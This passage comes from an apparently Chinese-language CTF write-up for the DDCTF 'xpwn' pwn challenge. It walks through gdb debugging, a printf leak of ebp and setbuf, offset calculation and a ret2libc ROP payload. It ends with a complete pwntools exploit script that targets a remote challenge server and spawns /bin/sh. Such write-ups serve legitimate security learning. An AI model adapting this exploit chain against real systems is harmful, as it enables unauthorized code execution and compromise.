3次出到最外层，最外层的地址就是0x80开头的这种，然后单步运行，你会发觉最后出错的地方在read这里，然后read函数出错，这里我当时不知道怎么继续调试下去了，一直卡死在这，还有个小问题，我发觉第一次printf会输出一些乱码，按照往常来说，这里肯定泄露了信息，所以具体这里泄露了什么信息，就得你自己去发现了。<br>后面从大佬的wp里发觉，他说ecx不能改，然后我就去看汇编代码了，</li></ul><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285j7w0nhj30iz0evdh0.jpg" alt="2"></p><ul><li>发觉最后一行有点道道，你看我上一张图的错误，0x6161615d,为什么不是0x61616161呢，ecx-4,联系起来没有，刚好0x61616161-0x6161615d = 4 ,也就是说，我把ecx覆盖成错误的值了，所以就没法正确读入了，那我如何找到ecx的正确位置呢,这时候就运用gdb了<br>我直接将Passwd(‘a’*0x60)这句注释掉，然后python运行这个脚本，然后用<br>gdb-peda$ pattern_create 200<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zdxr09j30m70f0tb5.jpg" alt="10"><br>创建一串字符，然后复制，然后<br>gdb-peda$ c<br>在打开的另一个终端里输入这串字符<br>然后获得这张图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zjk9y0j30md0c6dhf.jpg" alt="11"><br>Program received signal SIGSEGV (fault address 0x4141333d)<br>有这句话<br>然后复制这个address<br>0x4141333d,在将他+4，为什么要加4呢，因为我们刚刚那里ecx-了个4<br>所以变成0x41413341<br>gdb-peda$ pattern_offset 0x41413341<br>获得偏移，1094792001 found at offset: 68</li></ul><h2 id="定点泄露"><a href="#定点泄露" class="headerlink" title="定点泄露"></a>定点泄露</h2><p>68个偏移，好了，知道错误在哪了，如何泄露ecx？关键点来了，还记得刚开始的printf输出的乱码吗，这里肯定有泄露信息，从ida里我看不出什么东西，所以，gdb也调试一波了</p><p>你可以直接gdb filename 或者 gdb 启动后在file加载都行，</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285op2bscj30m70f9n1g.jpg" alt="3"></p><p>然后输入start开始，这时候你们的界面可能跟我不太一样，因为我装了插件，peda和pwndbg</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285sjp1qej31bd0qb13z.jpg" alt="4"></p><p>单步输入n 走到push ecx这里，因为我需要的是ecx，和ebp,为什么需要ebp呢，因为知道ebp我在知道偏移，整个栈的位置都知道了，所以我需要把这里的数据记录下来，可以看到，寄存器里存的值</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287w3uv2jj30qt0l6tdz.jpg" alt="12"></p><p>ecx 0xffffd160<br>ebp 0xffffd148<br>然后我需要继续运行软件，到我应该栈溢出的地方，这时候先下个断，<br>gdb$ b read<br>在read函数处下断，然后再<br>gdb$ c</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287we3ahoj30m80ekte2.jpg" alt="5"></p><p>这时候会在read函数处断下，不担心，输入finish<br>gdb$ finish<br>然后让你输入名字，直接回车，这时候继续单步，单步就是输入n(next)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wmw6ocj30vs0ok47n.jpg" alt="13"></p><p>在fprintf这里停下，看地址，取出0xffffd090<br>然后<br>gdb$ x/20wx 0xffffd090<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wt79m9j30kz03vaac.jpg" alt="14"></p><p>好了，我看到关键点了，0xffffd148,在第三行第三列里，也就是ebp的值，也就是说，我们需要输入10个4字节就可以到这个地方，还有，你看ebp后面的地址，0xf7e2c935，这里是不是很像libc函数的地址，这里我为什么说像呢，从上面我看寄存器那张图里可以看到__libc_start_main+241的地址，他就是这个类型的。</p><p>所以，我输出一下这里的地址看看内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/wx 0xf7e2c935</span><br><span class="line">0xf7e2c935 &lt;setbuf+21&gt;:	0xc31cc483</span><br></pre></td></tr></table></figure><p>果真如此，setbuf的地址我们也拿到了，一次性泄露了ebp和setbuf+21的地址，所以这时候怎么获得ecx的值呢，这里你就想每次栈的相对位置会变吗，不会的，所以，开局ebp和ecx的地址相差也不会变，所以我就用ebp和ecx的偏差<br>ecx 0xffffd160<br>ebp 0xffffd148<br>ecx - ebp = 0x18<br>所以ebp+0x18就是ecx了，找到ecx了，也找到setbuf地址了，现在便剩下</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>payload = ‘a’*0x44 + p32(ecx)+p32(system_addr)+p32(0) + p32(bin_sh)<br>按理说payload这样就行了，先填充位置，在填充ecx，在返回地址就完美了，运行下试试<br>这里我不告诉你们具体怎么做了，因为都是运行我刚刚讲的几条命令，finish,c，n,</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x3g3l0j30ss0mh0zp.jpg" alt="15"></p><p>看这里esp指向了我的system,也就是说我还没到返回地址，还有你看最后一步，他还会通过ecx-4改掉esp,所以还没到重点，所以很明显，我还要将两个pop填充掉，也就是得弄两个空的给他<br>payload = ‘a’<em>0x44 + p32(ecx)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br>这样下去可以填充掉那部分，还有个他改了esp的地址，看他修改了多少偏移<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x8ni0fj30rg0l6jwz.jpg" alt="16"><br>从图中可以看出esp跟ecp差了4个偏移，也就是4</em>4=16大小<br>所以我们可以<br>payload = ‘a’*0x44 + p32(ecx-16)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287xdxivlj30mr06x75l.jpg" alt="17"><br>yes,成功</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>现在从整体上来分析下过程，先利用printf泄露ebp和setbuf+21地址，然后利用ebp和ecx的固定偏移计算出ecx,然后定点覆盖到ecx具体地址，定位ret的位置，然后进行payload构造，最后成功ROP<br>附上最后的exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x44</span> + p32(ecx<span class="number">-16</span>) + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(system_addr)+p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">    Passwd(payload)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>这道题其实不难，难的是大部分要调试，调试部分的话，我写的也7,8成了，具体就靠你们自己慢慢去调试了，关键还是要看清栈的结构，知道他的位置，其余就是基本的ROP了,</li><li>虽然题目不难，但我光调试花了好长时间，最主要还是没了解还可以这么玩，学到了师傅们的姿势，谢谢ddctf，谢谢大佬们的writeup</li><li>如果还有什么不懂了，可以下方留言</li></ul><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/afd9f177/">https://noone-hub.github.io/posts/afd9f177/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 二进制</tag>
        <tag>栈</tag>
      </tags>
  </entry>
</search>
